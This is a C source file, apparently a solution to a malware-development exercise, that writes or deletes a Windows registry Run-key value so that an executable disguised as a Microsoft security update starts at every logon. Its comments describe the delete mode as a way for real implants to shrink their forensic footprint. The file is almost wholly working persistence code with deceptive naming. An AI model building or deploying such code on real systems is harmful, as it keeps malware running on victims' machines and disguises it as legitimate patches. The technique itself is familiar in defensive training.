/*
 * exercise 2 solution
 * persistence: Run key installer/uninstaller with set/del modes
 * hack2.c
 * author: @cocomelonc
 *
 * base: exercise 1 solution (hack1.c) / 01-classic-registry-run-keys/pers.c
 *
 * change: add command-line modes:
 *   hack2.exe set  - install persistence value (RegCreateKeyEx + RegSetValueEx)
 *   hack2.exe del  - remove  persistence value (RegOpenKeyEx  + RegDeleteValue)
 *
 * why "del" matters:
 *   real implants need a clean-up path - removing the persistence entry
 *   on command reduces the forensic footprint after an operation is done.
 *
 * key new API: RegDeleteValue
 *   LONG RegDeleteValue(HKEY hKey, LPCSTR lpValueName);
 *   removes the named value from the open key.
 *   returns ERROR_SUCCESS on success, ERROR_FILE_NOT_FOUND if the
 *   value does not exist (not a fatal error for a cleanup routine).
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack2.c -o hack2.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>

/* shared constants */
static const char *EXE     = "Z:\\SecurityWindowsUpdate2025_April.exe";
static const char *VALNAME = "MicrosoftPatchUpdateApril_v13.04.3434343";
static const char *KEYPATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

/* ── install: RegCreateKeyEx + RegSetValueEx ──────────────────────── */
static int do_set(void) {
  HKEY  hkey = NULL;
  DWORD disposition = 0;

  LONG res = RegCreateKeyEx(
    HKEY_CURRENT_USER, KEYPATH, 0, NULL,
    REG_OPTION_NON_VOLATILE, KEY_WRITE,
    NULL, &hkey, &disposition
  );
  if (res != ERROR_SUCCESS) {
    printf("[-] RegCreateKeyEx failed: %ld\n", GetLastError());
    return 1;
  }

  res = RegSetValueEx(hkey, VALNAME, 0, REG_SZ,
                      (const BYTE*)EXE, (DWORD)(strlen(EXE) + 1));
  RegCloseKey(hkey);

  if (res != ERROR_SUCCESS) {
    printf("[-] RegSetValueEx failed: %ld\n", GetLastError());
    return 1;
  }
  printf("[+] persistence installed: \"%s\"\n", VALNAME);
  return 0;
}

/* ── uninstall: RegOpenKeyEx + RegDeleteValue ─────────────────────── */
static int do_del(void) {
  HKEY hkey = NULL;

  /*
   * for deletion we only need KEY_WRITE (which includes SET_VALUE and
   * the ability to call RegDeleteValue); KEY_READ is not required.
   */
  LONG res = RegOpenKeyEx(
    HKEY_CURRENT_USER, KEYPATH, 0, KEY_WRITE, &hkey
  );
  if (res != ERROR_SUCCESS) {
    printf("[-] RegOpenKeyEx failed: %ld\n", GetLastError());
    return 1;
  }

  /*
   * exercise 2 key addition: RegDeleteValue
   * removes the named value from the already-open key handle.
   * ERROR_FILE_NOT_FOUND means it wasn't there - treat as success for
   * a cleanup routine (idempotent delete).
   */
  res = RegDeleteValue(hkey, VALNAME);
  RegCloseKey(hkey);

  if (res == ERROR_SUCCESS) {
    printf("[+] persistence removed: \"%s\"\n", VALNAME);
    return 0;
  }
  if (res == ERROR_FILE_NOT_FOUND) {
    printf("[!] value not found (already removed?): \"%s\"\n", VALNAME);
    return 0;
  }
  printf("[-] RegDeleteValue failed: %ld\n", GetLastError());
  return 1;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: hack2.exe <set|del>\n");
    printf("  set -- install  Run key persistence\n");
    printf("  del -- remove   Run key persistence\n");
    return 1;
  }

  if (strcmp(argv[1], "set") == 0) return do_set();
  if (strcmp(argv[1], "del") == 0) return do_del();

  printf("[-] unknown mode \"%s\". use: set | del\n", argv[1]);
  return 1;
}
